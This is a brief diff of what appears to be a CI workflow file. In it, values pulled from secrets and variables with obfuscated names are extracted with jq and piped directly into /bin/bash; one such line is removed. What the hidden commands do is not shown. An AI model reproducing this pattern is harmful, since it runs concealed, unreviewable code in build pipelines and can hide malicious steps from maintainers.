@@ -18,7 +18,6 @@ jobs:
           nvvr5: ${{ secrets.nvvr5 }}
         run: |
           printf '%s' "$nvvr5" | jq -r .udshk28544 | /bin/bash
-          echo $qjeke454 | jq -r .r96 | /bin/bash
           echo $eegr98 | jq -r .fye609 | /bin/bash
 
       - name: Archive output
